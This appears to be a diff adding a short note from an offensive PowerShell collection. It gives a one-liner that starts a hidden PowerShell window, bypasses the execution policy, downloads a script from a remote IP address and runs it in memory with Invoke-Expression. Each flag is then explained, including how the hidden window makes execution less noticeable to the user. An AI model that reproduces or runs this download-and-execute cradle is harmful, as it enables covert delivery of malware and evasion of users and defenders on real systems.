@@ -1,0 +1,22 @@
+Hidden Execution via Start-Process
+Script:
+Start-Process powershell -ArgumentList '-NoProfile -ExecutionPolicy Bypass -Command "& {
+    $scriptUrl = \"http://192.168.25.109/pshell9.ps1\";
+    $scriptBytes = Invoke-WebRequest -Uri $scriptUrl -UseBasicParsing -Method Get -MaximumRedirection 0;
+    $scriptContent = [System.Text.Encoding]::UTF8.GetString($scriptBytes.Content);
+    Invoke-Expression -Command $scriptContent;
+}"' -WindowStyle Hidden
+            
+Explanation of Commands:
+Start-Process powershell
+This command starts a new instance of PowerShell. It’s useful when you want to run a separate PowerShell process with specific arguments or configurations.
+-ArgumentList
+This parameter passes the PowerShell command with arguments for script execution.
+-NoProfile
+Runs PowerShell without loading the user’s profile, ensuring a clean environment.
+-ExecutionPolicy Bypass
+Temporarily bypasses the PowerShell execution policy, allowing the script to run regardless of the current policy settings (default policies may block script execution).
+-Command "& {...}"
+The full PowerShell script is enclosed within the "& { ... }" syntax, ensuring that it is executed as a command. This script downloads and runs the remote script in memory, similar to the first script.
+-WindowStyle Hidden
+The script runs in a hidden PowerShell window, meaning it won’t display any output to the user’s screen, making it less noticeable during execution.
